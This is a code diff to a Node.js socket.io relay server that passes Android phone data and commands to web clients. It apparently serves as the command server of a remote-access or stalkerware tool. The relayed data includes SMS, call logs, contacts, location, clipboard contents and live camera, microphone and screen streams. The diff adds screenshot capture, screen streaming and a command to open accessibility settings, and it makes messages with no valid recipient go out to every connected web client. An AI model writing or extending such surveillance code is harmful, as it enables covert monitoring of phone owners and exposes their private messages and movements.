@@ -141,12 +141,15 @@ io.on('connection', socket => {
     androidClients.forEach(androidId => {
       console.log(`Notifying Android ${androidId} about web client ${id}`);
       io.to(androidId).emit('web-client-ready', id);
+      io.to(id).emit('android-client-ready', androidId);
     });
   });
 
   socket.on('signal', data => {
     console.log(`Relaying signal from ${data.from} to ${data.to}: ${data.signal.type || 'candidate'}`);
-    console.log(`Signal content: ${JSON.stringify(data.signal)}`);
+    if (typeof data === 'object' && data !== null && !data.from) {
+      data.from = socket.id;
+    }
     if (data.to && io.sockets.sockets.get(data.to)) {
       io.to(data.to).emit('signal', data);
       console.log(`Signal delivered to ${data.to}`);
@@ -157,50 +160,58 @@ io.on('connection', socket => {
   });
 
   socket.on('notification', data => {
-    console.log(`Relaying notification from ${data.from} to ${data.to}`);
-    console.log(`Notification content: ${JSON.stringify(data.notification)}`);
+    console.log(`Relaying notification from ${data.from || socket.id} to ${data.to}`);
+    if (typeof data === 'object' && data !== null && !data.from) {
+      data.from = socket.id;
+    }
     if (data.to && io.sockets.sockets.get(data.to)) {
       io.to(data.to).emit('notification', data);
       console.log(`Notification delivered to ${data.to}`);
     } else {
-      console.warn(`Recipient ${data.to} not found for notification`);
-      socket.emit('error', { message: `Recipient ${data.to} not found for notification`, code: 'RECIPIENT_NOT_FOUND' });
+      webClients.forEach(id => io.to(id).emit('notification', data));
+      console.log(`Notification broadcast to all Web clients`);
     }
   });
 
   socket.on('call_log', data => {
-    console.log(`Relaying call log from ${data.from} to ${data.to}`);
-    console.log(`Call log content: ${JSON.stringify(data.call_logs)}`);
+    console.log(`Relaying call log from ${data.from || socket.id} to ${data.to}`);
+    if (typeof data === 'object' && data !== null && !data.from) {
+      data.from = socket.id;
+    }
     if (data.to && io.sockets.sockets.get(data.to)) {
       io.to(data.to).emit('call_log', data);
       console.log(`Call log delivered to ${data.to}`);
     } else {
-      console.warn(`Recipient ${data.to} not found for call log`);
-      socket.emit('error', { message: `Recipient ${data.to} not found for call log`, code: 'RECIPIENT_NOT_FOUND' });
+      webClients.forEach(id => io.to(id).emit('call_log', data));
+      console.log(`Call log broadcast to all Web clients`);
     }
   });
 
   socket.on('sms', data => {
-    console.log(`Relaying SMS from ${data.from} to ${data.to}`);
-    console.log(`SMS content: ${JSON.stringify(data.sms_messages)}`);
+    console.log(`Relaying SMS from ${data.from || socket.id} to ${data.to}`);
+    if (typeof data === 'object' && data !== null && !data.from) {
+      data.from = socket.id;
+    }
     if (data.to && io.sockets.sockets.get(data.to)) {
       io.to(data.to).emit('sms', data);
       console.log(`SMS delivered to ${data.to}`);
     } else {
-      console.warn(`Recipient ${data.to} not found for SMS`);
-      socket.emit('error', { message: `Recipient ${data.to} not found for SMS`, code: 'RECIPIENT_NOT_FOUND' });
+      webClients.forEach(id => io.to(id).emit('sms', data));
+      console.log(`SMS broadcast to all Web clients`);
     }
   });
 
   socket.on('location', data => {
-    console.log(`Relaying location from ${data.from} to ${data.to}`);
-    console.log(`Location content: lat=${data.latitude}, lng=${data.longitude}`);
+    console.log(`Relaying location from ${data.from || socket.id} to ${data.to}`);
+    if (typeof data === 'object' && data !== null && !data.from) {
+      data.from = socket.id;
+    }
     if (data.to && io.sockets.sockets.get(data.to)) {
       io.to(data.to).emit('location', data);
       console.log(`Location delivered to ${data.to}`);
     } else {
-      console.warn(`Recipient ${data.to} not found for location`);
-      socket.emit('error', { message: `Recipient ${data.to} not found for location`, code: 'RECIPIENT_NOT_FOUND' });
+      webClients.forEach(id => io.to(id).emit('location', data));
+      console.log(`Location broadcast to all Web clients`);
     }
   });
 
@@ -217,11 +228,12 @@ io.on('connection', socket => {
     'cmd:toast', 'cmd:open_url', 'cmd:flashlight', 'cmd:set_volume', 
     'cmd:set_brightness', 'cmd:ring', 'cmd:set_quality', 'cmd:set_gps_interval', 
     'cmd:launch_app', 'cmd:toggle_sensors', 'cmd:get_network', 'cmd:take_snapshot',
+    'cmd:take_screenshot', 'cmd:open_a11y_settings',
     'cmd:get_clipboard', 'cmd:set_clipboard', 'cmd:tts_speak',
-    'cmd:stream_camera', 'cmd:stream_mic', 'cmd:stream_location',
+    'cmd:stream_camera', 'cmd:stream_mic', 'cmd:stream_location', 'cmd:stream_screen',
     // Custom Data Responses
     'apps_list', 'contacts_list', 'device_info', 'sensor_data', 'network_info',
-    'snapshot_data', 'clipboard_data', 'stream_status'
+    'snapshot_data', 'screenshot_data', 'clipboard_data', 'stream_status'
   ];
 
   console.log('Registering relay event handlers');
@@ -232,8 +244,13 @@ io.on('connection', socket => {
       let targetId = null;
       let payload = data;
 
-      if (typeof data === 'object' && data !== null && data.to) {
-        targetId = data.to;
+      if (typeof data === 'object' && data !== null) {
+        if (!data.from) {
+          data.from = socket.id;
+        }
+        if (data.to) {
+          targetId = data.to;
+        }
       }
       
       if (targetId && io.sockets.sockets.get(targetId)) {
